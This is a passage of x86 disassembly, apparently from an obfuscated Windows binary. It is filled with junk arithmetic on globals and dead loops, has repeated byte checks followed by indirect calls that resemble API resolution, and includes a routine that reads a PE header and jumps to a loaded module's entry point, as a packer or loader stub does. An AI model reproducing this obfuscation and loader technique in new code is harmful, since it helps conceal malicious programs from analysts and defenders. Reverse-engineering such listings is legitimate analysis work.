  41c461:	mov    eax,ds:0x426ef5
  41c466:	inc    eax
  41c467:	mov    ds:0x426ef5,eax
  41c46c:	cmp    DWORD PTR ds:0x426ef5,0x1f
  41c473:	jb     0x41c41d
  41c479:	mov    eax,DWORD PTR [esp+0x10]
  41c47d:	xor    edx,DWORD PTR ds:0x426ecd
  41c483:	mov    edx,DWORD PTR ds:0x4262c9
  41c489:	mov    edx,DWORD PTR [edx+0x198]
  41c48f:	add    DWORD PTR ds:0x426ec5,0x6b2
  41c499:	xor    eax,esi
  41c49b:	adc    DWORD PTR ds:0x426f25,0x426ef9
  41c4a5:	add    eax,ebx
  41c4a7:	and    DWORD PTR ds:0x426e85,0x426f15
  41c4b1:	mov    DWORD PTR [edx],eax
  41c4b3:	mov    eax,DWORD PTR [esp+0x10]
  41c4b7:	sub    DWORD PTR ds:0x426ec9,0x4e94
  41c4c1:	xor    eax,esi
  41c4c3:	add    eax,ebx
  41c4c5:	adc    DWORD PTR ds:0x426e81,0x426e91
  41c4cf:	mov    ds:0x426d99,eax
  41c4d4:	mov    eax,DWORD PTR [esp+0x10]
  41c4d8:	adc    DWORD PTR ds:0x426eed,0x426ef9
  41c4e2:	xor    eax,esi
  41c4e4:	add    eax,ebx
  41c4e6:	sub    DWORD PTR ds:0x426ea9,0x426e85
  41c4f0:	mov    ds:0x4263c1,eax
  41c4f5:	mov    eax,ds:0x4262c9
  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af51
  41c85f:	mov    eax,ds:0x42af5d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
